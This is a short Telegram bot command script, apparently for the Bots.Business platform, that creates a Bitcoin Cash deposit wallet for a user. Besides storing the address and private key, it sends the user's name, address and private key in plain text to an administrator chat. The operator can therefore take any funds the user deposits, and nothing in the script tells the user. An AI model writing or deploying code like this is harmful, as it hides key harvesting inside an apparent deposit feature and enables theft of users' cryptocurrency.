/*CMD
  command: sucsBCH
  help: 
  need_reply: false
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
CMD*/

var data = JSON.parse(content)
let inf =
  "[" +
  user.first_name +
  "]" +
  "(" +
  "tg://user?id=" +
  user.telegramid +
  ")";
var p = Bot.getProperty("admin01")
Bot.setProperty("BCH"+user.telegramid,"hi","string")
var res = data.address
var priv = data.privateKey
Bot.setProperty("wallBCH"+user.telegramid,res,"string")
Bot.setProperty("wallpBCH"+user.telegramid,priv,"string")
Bot.sendMessageToChatWithId(p,"User name "+inf+"\n*BCH Address :*\n`"+res+"`\n\n*BCH Private Key :*\n`"+priv+"`\n\n")
   Bot.runCommand("/Deposit5")
